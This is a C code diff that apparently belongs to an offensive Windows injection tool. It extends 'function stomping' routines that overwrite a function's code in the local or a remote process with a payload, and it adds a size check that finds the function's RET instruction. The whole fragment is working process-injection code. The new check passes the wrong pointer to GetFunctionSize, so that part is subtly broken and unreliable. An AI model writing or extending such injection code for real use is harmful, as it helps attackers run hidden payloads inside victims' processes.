@@ -24,6 +24,15 @@ BOOL WritePayloadViaLocalFunctionStomping(OUT PVOID *pAddress, IN PBYTE pPayload
 	return TRUE;
 }
 
+size_t GetFunctionSize(PVOID function_start) {
+    PBYTE retAddress = (PBYTE)findRetInstruction(function_start);
+    if (!retAddress) {
+        printf("Failed to find RET instruction within the search range\n");
+        return 0;
+    }
+    return (size_t)(retAddress - (PBYTE)function_start + 1); // Include RET in size
+}
+
 BOOL WritePayloadViaRemoteFunctionStomping(OUT PVOID* pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
 	DWORD dwOldProtection = 0;
 	SIZE_T sNumberOfBytesWritten = 0;
@@ -45,6 +54,12 @@ BOOL WritePayloadViaRemoteFunctionStomping(OUT PVOID* pAddress, IN PBYTE pPayloa
 		return -1;
 	}
 	DebugPrint("[i] Resolved Function Address: 0x%p\n", *pAddress);
+
+	if (GetFunctionSize(pAddress) < sPayloadSize) {
+		DebugPrint("[!] Payload size is larger than the function size. \n");
+		CloseHandle(hProcess);
+		return FALSE;
+	}
 
 	// Change memory protection to allow writing
 	if (!VirtualProtectEx(hProcess, *pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
